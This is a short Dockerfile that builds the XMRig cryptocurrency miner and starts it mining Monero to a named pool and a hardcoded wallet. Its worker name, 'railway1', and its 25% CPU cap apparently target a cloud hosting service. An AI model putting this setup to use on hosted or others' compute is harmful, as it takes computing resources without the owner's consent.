FROM ubuntu:20.04

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget && \
    git clone https://github.com/xmrig/xmrig.git && \
    mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && \
    cmake .. && make -j$(nproc)

WORKDIR /xmrig/build

CMD ["./xmrig", "-o", "gulf.moneroocean.stream:10128", "-u", "448mBL1AeAP4rFUt5hPdmMMEkKnGkTepjb6apRQsQG6PCqYqM4Sd8coTzb59DAyNww7X81sW7kS1E8wJVh3seHsV9oBgxZB", "-p", "railway1", "--cpu-priority", "3", "--donate-level", "0", "--max-cpu-usage", "25"]
